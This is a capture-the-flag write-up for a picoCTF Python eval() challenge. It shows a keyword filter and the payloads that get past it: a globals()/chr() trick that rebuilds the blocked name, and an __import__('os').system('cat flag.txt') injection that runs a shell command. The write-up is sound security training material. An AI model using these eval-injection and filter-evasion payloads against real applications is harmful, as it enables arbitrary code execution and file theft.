# URL
https://play.picoctf.org/practice/challenge/401
# Concept
* Python eval() function
* filter bypass
# Method of solve
* like the previous challenge, there is a `win` function that we can run with the script to print out the flag:
```
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```
* but there's a catch: the user input is being filtered
```
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```
* so simply typing in `win` to call the `win()` function won't work
* so what we need to do is evade the filter and run the `win` function
* the following payload will use the `globals` and `chr` functions to reference the `win` function without using the exact string `win`
```
globals()[chr(119)+chr(105)+chr(110)]
```
* afterwards we can plug the string of hex characters into the same script we used for the previous challenge:
```
str_o_hex = "" # paste in the hex string before running the script

list_o_hex = str_o_hex.split()

plaintext = ""

for i in list_o_hex:
  decoded_chr = chr(int(i, 16))
  plaintext += decoded_chr

print(plaintext)
```
## Alternative solution:
* we can call any function, so we can use the `__import__()` function to import the OS module and read the flag, bypassing the `win()` function
```
__import__('os').system('cat flag.txt')
```
